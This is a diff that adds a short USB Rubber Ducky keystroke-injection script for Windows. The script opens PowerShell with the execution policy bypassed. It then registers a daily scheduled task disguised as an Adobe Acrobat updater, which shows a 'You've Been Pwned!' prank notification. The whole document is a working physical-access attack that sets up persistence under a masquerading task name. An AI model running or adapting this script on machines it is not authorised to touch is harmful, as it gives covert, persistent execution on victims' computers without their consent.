@@ -1,0 +1,24 @@
+REM RubberDucky Powershell and Scheduled Tasks
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 500
+STRING PowerShell.exe -ExecutionPolicy Bypass
+ENTER
+DELAY 500
+STRING $action = New-ScheduledTaskAction -Execute 'wlrmdr.exe' -Argument " -s 60000 -f 1 -t You've Been Pwned! -m Remember that USB you plugged in? Pepperidge Farm Remembers. -a o" 
+ENTER
+DELAY 1000
+STRING $trigger = New-ScheduledTaskTrigger -Daily -At 3:14pm
+ENTER
+DELAY 500
+STRING Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Adobe Acrobat Update Tusk" -Description "This task doesn't keep your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes"
+ENTER
+DELAY 500
+STRING exit 
+ENTER
+DELAY 500
+STRING exit
+ENTER
